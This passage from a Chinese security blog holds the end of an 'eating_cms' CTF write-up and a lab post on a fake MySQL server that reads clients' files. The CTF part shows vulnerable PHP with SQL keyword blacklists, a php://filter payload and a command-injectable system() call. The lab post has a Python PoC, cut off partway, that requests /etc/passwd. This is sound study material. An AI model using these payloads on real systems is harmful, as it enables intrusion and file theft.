hacker.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">&#x27;query&#x27;</span>], $query);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory_guest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>,<span class="string">&quot;info&quot;</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">&#x27;query&#x27;</span>], $query);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Filter</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $blacklist = <span class="string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;</span><br><span class="line">    $whitelist = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($string); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="string">&quot;<span class="subst">$whitelist</span>&quot;</span>, $string[$i]) === <span class="literal">false</span>) &#123;</span><br><span class="line">            Hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/<span class="subst">$blacklist</span>/is&quot;</span>, $string)) &#123;</span><br><span class="line">        Hacker();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_string($string)) &#123;</span><br><span class="line">        <span class="keyword">return</span> $mysqli-&gt;real_escape_string($string);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_query</span>(<span class="params">$sql_query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $res = $mysqli-&gt;query($sql_query);</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$user, $pass</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $user = Filter($user);</span><br><span class="line">    $pass = md5($pass);</span><br><span class="line">    $sql = <span class="string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="subst">$pass</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        $data = $res-&gt;fetch_array();</span><br><span class="line">        $_SESSION[<span class="string">&#x27;user&#x27;</span>] = $data[username_which_you_do_not_know];</span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;isadmin&#x27;</span>] = $data[isadmin_which_you_do_not_know_too_too];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateadmin</span>(<span class="params">$level,$user</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sql = <span class="string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="subst">$user</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//    die($res);</span></span><br><span class="line">    <span class="keyword">if</span> ($res == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">$user, $pass</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $user = Filter($user);</span><br><span class="line">    $pass = md5($pass);</span><br><span class="line">    $sql = <span class="string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="subst">$user</span>&#x27;,&#x27;<span class="subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;</span><br><span class="line">    $res = sql_query($sql);</span><br><span class="line">    <span class="keyword">return</span> $mysqli-&gt;insert_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">    Header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $keywords = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>];</span><br><span class="line">    $uri = parse_url($_SERVER[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    parse_str($uri[<span class="string">&#x27;query&#x27;</span>], $query);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>($keywords <span class="keyword">as</span> $token)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($query <span class="keyword">as</span> $k =&gt; $v)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (stristr($k, $token))</span><br><span class="line">                hacker();</span><br><span class="line">            <span class="keyword">if</span> (stristr($v, $token))</span><br><span class="line">                hacker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对<code>url</code>进行了关键词过滤，用的是<code>parse_url</code>: <a href="https://blog.csdn.net/q1352483315/article/details/89672426">parse_url函数的解释和绕过</a></p><p><code>ffffllllaaaaggg m4aaannngggeee</code>应该是敏感文件</p><p><code>?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ffffllllaaaaggg</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you can not visit it directly&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you can find sth in m4aaannngggeee&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//m4aaannngggeee</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you can not visit it directly&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;templates/upload.html&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>emmmm……后来大致相同，但关键在于：</p><p><code>upllloadddd.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$picdata = system(<span class="string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.$filename.<span class="string">&quot; | base64 -w 0&quot;</span>);</span><br></pre></td></tr></table></figure><p>命令的直接拼接，造成了命令注入……就在filename……直接搞文件名就行了，好吧</p><p>🐕</p><p>参考文章:<br><a href="https://blog.csdn.net/Youth____/article/details/113118323">[N1CTF 2018]eating_cms</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;竞争文件包含、命令注入、parse_url漏洞&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>实验--Mysql服务端反向读取客户端的任意文件</title>
    <link href="http://example.com/2021/09/08/%E5%AE%9E%E9%AA%8C--Mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%8D%E5%90%91%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/"/>
    <id>http://example.com/2021/09/08/%E5%AE%9E%E9%AA%8C--Mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%8D%E5%90%91%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/</id>
    <published>2021-09-08T05:51:10.185Z</published>
    <updated>2021-09-08T10:06:22.892Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>伪造MySQL服务器对客户端实现任意文件读取</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#%E5%AE%9E%E9%AA%8C-mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%8D%E5%90%91%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6">实验–Mysql服务端反向读取客户端的任意文件</a><ul><li><a href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87-kali%E4%B8%8A%E5%AE%89%E8%A3%85mysql">环境准备-kali上安装mysql</a><ul><li><a href="#1%E5%AE%89%E8%A3%85%E5%8C%85">1.安装包</a></li><li><a href="#2%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE">2.文件配置</a></li><li><a href="#3%E5%90%AF%E5%8A%A8%E4%B8%8E%E5%88%9D%E5%A7%8B%E5%8C%96">3.启动与初始化</a></li></ul></li><li><a href="#%E5%8E%9F%E7%90%86%E5%87%86%E5%A4%87">原理准备</a><ul><li><a href="#-load-data-infile">-Load Data infile</a></li><li><a href="#-%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90">-抓包分析</a><ul><li><a href="#%E6%8F%A1%E6%89%8B%E8%AE%A4%E8%AF%81%E9%98%B6%E6%AE%B5">握手认证阶段</a></li><li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%98%B6%E6%AE%B5">命令执行阶段</a></li></ul></li><li><a href="#-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84file-transfer">-不安全的file-transfer</a></li></ul></li><li><a href="#%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E5%99%A8">伪造MySQL服务器</a><ul><li><a href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6">攻击条件</a></li><li><a href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B">攻击流程</a></li><li><a href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BC%AA%E9%80%A0"><strong>服务端伪造</strong></a><ul><li><a href="#-%E5%8C%85%E4%BC%AA%E9%80%A0">-包伪造：</a></li><li><a href="#-poc">-PoC</a></li></ul></li></ul></li><li><a href="#%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95">攻击测试</a></li><li><a href="#%E5%85%B6%E4%BB%96poc">其他PoC</a></li><li><a href="#%E5%AD%A6%E4%B9%A0">学习</a></li></ul></li></ul><!-- tocstop --></div><br>### 实验--Mysql服务端反向读取客户端的任意文件<blockquote><p>实验环境：</p><p>客户端：kali-linux-2020.3 | MySQL：10.5.12-MariaDB-1</p><p>服务端：centos8 | MySQL：5.6.50-log </p><p>综合参考：<a href="https://lightless.me/archives/read-mysql-client-file.html">https://lightless.me/archives/read-mysql-client-file.html</a></p></blockquote><h4><span id="环境准备-kali上安装mysql">环境准备-kali上安装mysql</span></h4><blockquote><p>参考：<a href="https://www.cnblogs.com/faithfu/p/10278163.html">https://www.cnblogs.com/faithfu/p/10278163.html</a></p></blockquote><h5><span id="1安装包">1.安装包</span></h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mariadb-client</span><br><span class="line">apt-get install mariadb-server</span><br></pre></td></tr></table></figure><h5><span id="2文件配置">2.文件配置</span></h5><p><code>/etc/mysql/my.cnf</code> 添加：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[client-server]</span></span><br><span class="line"><span class="attr">default-character-set</span>=utf8</span><br><span class="line"></span><br><span class="line"><span class="attr">port</span> = <span class="number">3306</span></span><br><span class="line"><span class="attr">socket</span>    = /tmp/mysql.sock</span><br><span class="line"></span><br><span class="line"><span class="section">[mysql]</span></span><br><span class="line"><span class="attr">default-character-set</span>=utf8</span><br><span class="line"></span><br><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">basedir</span>=/usr/local/mysql/</span><br><span class="line"><span class="attr">datadir</span>=/usr/local/mysql/data/mysql</span><br><span class="line"><span class="comment">#character-set-server=utf8</span></span><br></pre></td></tr></table></figure><h5><span id="3启动与初始化">3.启动与初始化</span></h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service mysql start #启动myslq</span><br><span class="line">mysql_secure_installation #初始化密码</span><br><span class="line">.....自定义安装</span><br></pre></td></tr></table></figure><h4><span id="原理准备">原理准备</span></h4><h5><span id="-load-data-infile">-Load Data infile</span></h5><blockquote><p>LOAD DATA INFILE 语句以非常高的速度从文本文件中读取行到表中，可用来快速导入数据</p></blockquote><p>该语法通常有两种用法，分别是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">&quot;/data/data.csv&quot;</span> <span class="keyword">into</span> <span class="keyword">table</span> TestTable;</span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> <span class="keyword">infile</span> <span class="string">&quot;/home/lightless/data.csv&quot;</span> <span class="keyword">into</span> <span class="keyword">table</span> TestTable;</span><br></pre></td></tr></table></figure><blockquote><p>有时候也会与<code>FIELDS TERMINATED BY &#39;\n&#39;</code>一起使用，效果更佳。这两种用法的区别就是差了一个<code>local</code>，第一个 SQL 语句的意思是，读取服务器上<code>/data/data.csv</code>文件，并写入到<code>TestTable</code>中；第二个 SQL 语句的意思则是，读取本地（客户端）这边的<code>/home/lightless/data.csv</code>文件，并写入到<code>TestTable</code>中。而我们这次要利用的也就是<code>LOAD DATA LOCAL INFILE</code>这种形式。</p></blockquote><p><code>load data local infile</code> 就是客户端申请将本地文件写入表中的语句，我们可以从这个语句切入，看看这个机制是如何运作的</p><h5><span id="-抓包分析">-抓包分析</span></h5><blockquote><p>参考：</p><p>– <a href="https://www.jianshu.com/p/3d26180268d7?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation">抓包分析参考</a></p><p>– <a href="https://blog.csdn.net/LYue123/article/details/89256577?spm=1001.2014.3001.5501"><strong>彻底弄懂mysql（一）–mysql的通信协议 ★</strong></a></p></blockquote><h6><span id="握手认证阶段">握手认证阶段</span></h6><p>wireshark 过滤设置<code>port：3036</code></p><p>kali远程连接服务器上的mysql：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h xxxx -u test -p</span><br></pre></td></tr></table></figure><img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908143517892.png" alt="image-20210908143517892" style="zoom:80%;"><p>这十三条响应就是客户端与服务端建立连接的过程</p><img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908144742807.png" alt="image-20210908144742807" style="zoom:80%;"><p>可以看到在<strong>握手认证阶段</strong>：</p><ol><li>greeting <strong>握手初始化包</strong></li><li>login <strong>登陆认证消息</strong></li><li>Response OK <strong>认证结果</strong></li><li>初始化查询语句等  <code>Statement: select @@version_comment limit 1</code> ……</li></ol><p>认证成功则会进入<strong>命令执行阶段</strong>；</p><h6><span id="命令执行阶段">命令执行阶段</span></h6><p>现在在客户机上执行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> <span class="keyword">LOCAL</span> <span class="keyword">INFILE</span> <span class="string">&#x27;/etc/passwd&#x27;</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> <span class="keyword">test</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">&#x27;\n&#x27;</span>;</span><br></pre></td></tr></table></figure><img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908145538553.png" alt="image-20210908145538553" style="zoom:80%;"><ol><li>query语句发送，申请上传文件</li><li>服务器返回一个文件传输申请（<strong>file-transfer请求</strong>）（TABULAR）</li><li>客户端发送<code>Malformed Packet</code>包，包含上传的<strong>数据文件</strong></li></ol><p>这看起来十分合理！</p><h5><span id="-不安全的file-transfer">-不安全的file-transfer</span></h5><blockquote><p>参考：<a href="https://www.cnblogs.com/Rain99-/p/13334755.html#41-mysql%E5%8E%9F%E7%94%9Fclient">https://www.cnblogs.com/Rain99-/p/13334755.html#41-mysql%E5%8E%9F%E7%94%9Fclient</a></p></blockquote><blockquote><p>Mysql官方文档：</p><p>一：</p><p>“In theory, a patched server could be built that would tell the client program to transfer a file of the server’s choosing rather than the file named by the client in the LOAD DATA statement.”</p><img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908153753755.png" alt="image-20210908153753755" style="zoom:80%;"><p>二：</p><p>“A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL”</p><img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908154314188.png" alt="image-20210908154314188" style="zoom:80%;"></blockquote><p>无论你是否使用<strong>LOAD DATA LOCAL</strong>，服务端都可以<strong>回复一个 file-transfer 请求</strong>，客户端接到此请求，就会返回一个<strong>指定的文件内容</strong>。</p><p>于是，我们依照此思路，伪造一个MySQL服务器，伪造发包即可。</p><h4><span id="伪造mysql服务器">伪造MySQL服务器</span></h4><h5><span id="攻击条件">攻击条件</span></h5><p>如果想要利用此特性，客户端必须具有 <code>CLIENT_LOCAL_FILES</code> 属性，所以请求连接时可能要添加<code>--enable-local-infile</code>以打开功能。现实情况中，某些功能的开启可能需要此属性。</p><h5><span id="攻击流程">攻击流程</span></h5><blockquote><ol><li>受害者向攻击者提供的服务器发起请求，并尝试进行身份认证。</li><li>攻击者的MySQL接受到受害者的连接请求，攻击者发送正常的问候、身份验证正确，成功连接后向受害者的MySQL客户端请求文件。</li><li>受害者的MySQL客户端认为身份验证正确，执行攻击者的发来的请求，通过 <code>LOAD DATA INLINE</code> 功能将文件内容发送回攻击者的MySQL服务器。</li><li>攻击者收到受害者服务器上的信息，读取文件成功，攻击完成。</li></ol></blockquote><h5><span id="服务端伪造"><strong>服务端伪造</strong></span></h5><blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/apossin/p/10127496.html">分析</a></p><p><a href="https://www.jianshu.com/p/3d26180268d7?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation">抓包分析参考</a></p></blockquote><h6><span id="-包伪造">-包伪造：</span></h6><blockquote><p>不需要真的搞个Mysql服务，在mysql客户端连接时，模仿服务端返回Server Greeting<br>等待 Client 端发送一个<strong>Query Package</strong>后<br>回复一个<strong>file transfer</strong>请求<br>即可读取到文件</p><p>大概就像……：</p><p><strong>客户端：hi,现在我要查询一下版本信息</strong><br><strong>服务端：好的，把/etc/passwd文件发过来吧</strong><br><strong>客户端：好的，这是我的/etc/passwd文件</strong></p></blockquote><p>我们用python模拟这一过程，不用去考虑其他层次的协议，python帮助我们完成了这个工作，只需要关注<strong>MySQL Protocol</strong></p><p><strong>greeting package</strong>：</p><img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908171243202.png" alt="image-20210908171243202" style="zoom:80%;"><p><strong>auth ：认证消息包</strong></p><img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908171746376.png" alt="image-20210908171746376" style="zoom:80%;"><p><strong>file-transfer ：文件传输请求</strong></p><p>格式：<a href="https://dev.mysql.com/doc/internals/en/com-query-response.html">https://dev.mysql.com/doc/internals/en/com-query-response.html</a></p><img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908171922416.png" alt="image-20210908171922416" style="zoom:80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0c 00 00 01 fb 2f 65 74    63 2f 70 61 73 73 77 64    .....&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>前面的<code>0x0c</code>是数据包的长度（从 \ xfb 开始计算），长度后面的三个字节<code>\x00\x00\x01</code>是数据包的序号。</p><p>即：<code>数据包长度</code>+<code>数据包序号</code>+<code>数据包内容</code>；</p><blockquote><img src="/images/实验--Mysql服务端反向读取客户端的任意文件/image-20210908173513285.png" alt="image-20210908173513285" style="zoom:80%;"><p><em>我们需要等待一个来自 Client 的查询请求，才能回复这个读文件的请求</em></p></blockquote><p>那么，如何做呢？</p><h6><span id="-poc">-PoC</span></h6><blockquote><p>参考：*<a href="https://www.cnblogs.com/apossin/p/10127496.html">PoC参考</a>*</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="comment">#python 2</span></span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;/etc/passwd&quot;</span> <span class="comment">#索求文件</span></span><br><span class="line">sv = socket.socket()</span><br><span class="line">sv.bind((<span class="string">&quot;&quot;</span>, <span class="number">6666</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn, address = sv.accept() <span class="comment">#被动建立连接</span></span><br><span class="line">logging.info(<span class="string">&#x27;Conn from: %r&#x27;</span>, address)</span><br><span class="line">greeting1 = <span class="string">&quot;\x4e\x00\x00\x00\x0a\x35\x2e\x36\x2e\x35\x30\x2d\x6c\x6f\x67\x00&quot;</span> \</span><br><span class="line">           <span class="string">&quot;\x1b\x02\x00\x00\x59\x22\x38\x37\x49\x48\x6c\x6a\x00\xff\xf7\x2d&quot;</span> \</span><br><span class="line">           <span class="string">&quot;\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4f&quot;</span> \</span><br><span class="line">           <span class="string">&quot;\x2e\x34\x5b\x4e\x56\x46\x3b\x34\x34\x48\x4e\x00\x6d\x79\x73\x71&quot;</span> \</span><br><span class="line">           <span class="string">&quot;\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72&quot;</span> \</span><br><span class="line">           <span class="string">&quot;\x64\x00&quot;</span> <span class="comment">#原greeting包</span></span><br><span class="line"><span class="comment">#个人抓包得greeting包</span></span><br><span class="line">greeting2 = <span class="string">&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff&quot;</span> \</span><br><span class="line">            <span class="string">&quot;\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a&quot;</span> \</span><br><span class="line">            <span 